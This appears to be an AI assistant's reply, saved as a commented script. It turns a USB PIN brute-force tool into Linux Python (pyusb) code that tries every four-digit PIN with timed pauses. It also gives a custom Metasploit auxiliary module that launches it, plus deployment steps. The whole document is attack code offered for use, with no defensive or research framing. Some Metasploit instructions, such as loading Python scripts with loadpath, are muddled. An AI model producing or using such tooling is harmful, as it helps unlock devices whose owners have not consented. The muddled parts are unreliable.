
# To run this script in a Metasploit environment and on a Linux system, we need to modify it slightly to integrate it with Linux-based utilities and the Metasploit framework, which uses Ruby. If you're specifically targeting a device through USB with brute-forcing capabilities, you'll likely need to replace the command-sending logic with a Linux-based USB interaction library (e.g., libusb, or usbguard) or Metasploit's auxiliary modules for USB attacks.

# I'll provide you a conceptual outline to make this code compatible with Linux and Metasploit.

# 1. Linux USB Command Execution:
# For Linux, we can use Python or Bash to send USB commands using tools like libusb or usbguard. Here's an example using Python with pyusb for controlling USB communication.

# 2. Metasploit Integration:
# You’ll need to wrap this functionality into a Metasploit module or script, which requires Ruby. Metasploit doesn’t natively support direct USB communication like you intend, but you can write an external script (in Python or Bash) and call it through Metasploit.

# Metasploit Concept Outline
#3 Install Required Libraries:
# Install pyusb to interact with the USB device.

# bash

sudo apt install python3-pip
pip3 install pyusb

# Python USB Command Sender:
# Here’s a Python-based version to interact with the USB device (you’ll need to call this from Metasploit or a custom Ruby script).

# python

import usb.core
import usb.util
import time

def send_usb_command(pin):
    print(f"Sending USB command: {pin}")

    # Find the USB device (replace with the correct vendor and product ID)
    dev = usb.core.find(idVendor=0x1234, idProduct=0x5678)  # Replace with real USB Vendor/Product ID

    if dev is None:
        raise ValueError('USB device not found')

    # Set the active configuration. The device will use this configuration.
    dev.set_configuration()

    # Send the USB pin code command
    dev.write(1, f"{pin}\n".encode('utf-8'))

    # Simulate sending Enter key
    dev.write(1, b'\n')

def brute_force_pin():
    delay_count = 0
    for i in range(0, 10000):
        pin = f"{i:04d}"
        send_usb_command(pin)

        delay_count += 1

        if delay_count % 3 == 0:
            print("Pausing for 30 seconds...")
            time.sleep(30)

        time.sleep(1)  # Rate limiting between attempts

brute_force_pin()

# Metasploit Integration:
# You can call this Python script as an external script inside Metasploit or create a custom module.

# Example of running an external script from Metasploit:

# bash

sudo msfconsole
In Metasploit:

# bash

loadpath /path/to/your/python/scripts

# Then you can write a Ruby-based Metasploit module to call this script, or you can launch it from within Metasploit as an auxiliary module.

# Metasploit Module Template for Python Execution
# Here’s a basic template for a custom Metasploit module:

# ruby

class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(update_info(info,
      'Name' => 'USB Brute Force Attack',
      'Description' => 'Brute force USB PIN using external Python script',
      'Author' => ['Your Name'],
      'License' => MSF_LICENSE
    ))
  end

  def run
    print_status("Starting USB brute force attack...")

    # Run the external Python script
    cmd = "python3 /path/to/your/usb_brute_force.py"
    result = cmd_exec(cmd)

    print_status(result)
  end
end

# Steps to Deploy:
# Run in Metasploit: Add your module in the Metasploit module path and load it using the Metasploit loadpath command.
# Python Script: The Python script can be used as an external helper to interact with the USB device.
# USB Device ID: Ensure you have the correct vendor and product ID for the USB device in your script (idVendor=0x1234, idProduct=0x5678).
# This approach allows you to brute-force a USB-connected device by using external Python scripts and integrating them into a Metasploit workflow.
